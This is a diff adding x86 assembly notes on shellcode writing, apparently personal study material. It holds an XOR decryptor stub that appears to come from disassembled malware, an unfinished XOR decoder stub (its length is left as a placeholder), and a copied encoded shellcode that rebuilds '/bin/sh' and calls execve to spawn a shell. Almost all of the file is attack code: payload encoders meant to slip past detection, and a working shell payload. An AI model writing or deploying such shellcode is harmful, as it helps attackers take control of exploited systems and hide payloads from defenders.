@@ -1,0 +1,85 @@
+   jmp do_decrypt
+decrypt_and_go:
+   pop edi ; edi = offset encrypted_area push edi
+   pop esi ; esi = offset encrypted_area xor ecx, ecx
+loc_8A65:
+   lodsd
+   cmp eax, 0FF773311h
+   jz short encrypted_area test ecx, 1
+   jnz short loc_8A7C
+   xor eax, 16D4A07h
+   jmp short loc_8A81
+loc_8A7C:
+   xor eax, 42BC4B2h
+loc_8A81:
+   stosd
+   inc ecx
+   jmp short loc_8A65 do_decrypt:
+   call decrypt_and_go 
+encrypted_area:
+
+
+
+##### Attempt
+# nasm -o xordecoder xordecoder.S
+
+BITS 32
+
+jmp short callit ; jmp to the call by offset
+
+xor_decode:
+pop esi       ; get address that call stored, so esi = encrypted_area
+mov edi, esi  ; put esi into esi to use for the call later
+mov edx, esi  ; put esi into edx to use for the call later
+; cld ?
+mov ecx, <>   ; put length to decode into ecx
+mov ebx, 0xff ; put the xor key into ebx, try 0x41 for real, 0xff to use unencoded shell
+xor eax, eax  ; zero the reg where the decoded value will be stored
+push eax      ; zero the top of the stack
+
+loop_decode:
+lodsb         ; load byte value where esi is pointing into eax
+xor eax, ebx  ; eax ^ ebx (decode eax value using ebx as key)
+stosb         ; store eax (result) where edi is pointing
+loop loop_decode
+
+call edx     ; jump to the decoded code
+
+callit:
+call xor_decode ; call pushes next insn address (encrypted area) onto stack
+; encrypted_area is appended here
+
+
+
+
+
+http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html
+BITS 32
+
+jmp short       callit
+
+doit:
+
+pop             esi
+xor             eax, eax
+mov byte        [esi + 7], al
+lea             ebx, [esi]
+mov long        [esi + 8], ebx
+mov long        [esi + 12], eax
+
+mov             cl,7                 ; The loop begins here, we will loop 7 times
+change:
+dec byte        [esi + ecx - 1 ]     ; Change the byte on the right location 
+sub             cl, 1                ; Update the counter 'cl'
+jnz change                           ; Verify if we should break the loop 
+
+mov byte        al, 0x0b
+mov             ebx, esi
+lea             ecx, [esi + 8]
+lea             edx, [esi + 12]
+int             0x80
+
+callit:
+call            doit
+
+db              '0cjo0ti#AAAABBBB'
